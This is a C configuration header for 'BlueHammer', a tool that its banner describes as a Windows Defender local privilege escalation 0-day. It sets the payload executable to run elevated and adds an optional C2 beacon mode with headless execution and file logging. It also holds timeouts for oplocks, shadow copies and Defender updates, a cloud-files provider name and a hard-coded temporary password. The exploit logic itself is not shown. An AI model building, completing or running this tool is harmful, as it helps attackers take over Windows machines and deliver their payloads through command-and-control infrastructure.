#pragma once

// ============================================================================
// BlueHammer Stable Version
// Windows Defender LPE (0-day)
// ============================================================================

// OUTPUT MODE - Set to 0 for minimal, 1 for verbose

#define VERBOSE_OUTPUT 0

// Headless mode (no pauses) - set to 1 for C2
#define HEADLESS_MODE 1

// C2 MODE - Uncomment below for beacon execution

// #define C2_MODE 1
// #define LOG_TO_FILE 1
// #define LOG_FILE_PATH L"C:\\Temp\\bluehammer.log"
// #define PAYLOAD_EXECUTABLE L"C:\\Yourpayload\\Path\\test.exe"
// #define PAYLOAD_COMMANDLINE NULL

// Default Mode

#ifndef PAYLOAD_EXECUTABLE
#define PAYLOAD_EXECUTABLE L"C:\\Windows\\System32\\conhost.exe"
#define PAYLOAD_COMMANDLINE NULL
#endif

// TIMING CONFIGURATION  

#define UPDATE_CHECK_INTERVAL_MS 30000
#define OPLOCK_TIMEOUT_MS 60000
#define VSS_WAIT_TIMEOUT_MS 30000
#define DEFENDER_UPDATE_TIMEOUT_MS 60000

// CLOUD FILES / CREDENTIALS

#define CF_PROVIDER_NAME L"MicrosoftCloudProvider"
#define CF_PROVIDER_VERSION L"2.1"
#define TEMP_PASSWORD "Spr1ng2026!Pwd#"
#define TEMP_PASSWORD_W L"Spr1ng2026!Pwd#"


// Blocked Paths - i had issues with these so why not

#define BLOCKED_PATH_1 L"\\Windows\\Tasks"
#define BLOCKED_PATH_2 L"\\Windows\\System32"
#define BLOCKED_PATH_3 L"\\Windows\\SysWOW64"
#define BLOCKED_PATH_4 L"\\Windows\\Temp"

// LOGGING

#ifdef LOG_TO_FILE
    // File logging for C2 - output goes to file AND console
    #include <stdio.h>
    inline void _log_to_file(const char* msg) {
        FILE* f = _wfopen(LOG_FILE_PATH, L"a");
        if (f) { fprintf(f, "%s\n", msg); fclose(f); }
    }
    #define LOG_PHASE(fmt, ...) do { char _b[512]; snprintf(_b, 512, "[*] " fmt, ##__VA_ARGS__); printf("%s\n", _b); _log_to_file(_b); } while(0)
    #define LOG_SUCCESS(fmt, ...) do { char _b[512]; snprintf(_b, 512, "[+] " fmt, ##__VA_ARGS__); printf("%s\n", _b); _log_to_file(_b); } while(0)
    #define LOG_ERROR(fmt, ...) do { char _b[512]; snprintf(_b, 512, "[-] " fmt, ##__VA_ARGS__); printf("%s\n", _b); _log_to_file(_b); } while(0)
#else
    // Console only
    #define LOG_PHASE(fmt, ...) printf("[*] " fmt "\n", ##__VA_ARGS__)
    #define LOG_SUCCESS(fmt, ...) printf("[+] " fmt "\n", ##__VA_ARGS__)
    #define LOG_ERROR(fmt, ...) printf("[-] " fmt "\n", ##__VA_ARGS__)
#endif

// Debug only in verbose mode
#if VERBOSE_OUTPUT
    #define LOG_DEBUG(fmt, ...) printf("    " fmt "\n", ##__VA_ARGS__)
    #define LOG_INFO(fmt, ...) printf("[*] " fmt "\n", ##__VA_ARGS__)
#else
    #define LOG_DEBUG(fmt, ...)
    #define LOG_INFO(fmt, ...)
#endif

// Headless mode
#if HEADLESS_MODE
    #define WAIT_FOR_KEY()
#else
    #define WAIT_FOR_KEY() do { printf("\nPress any key...\n"); _getch(); } while(0)
#endif
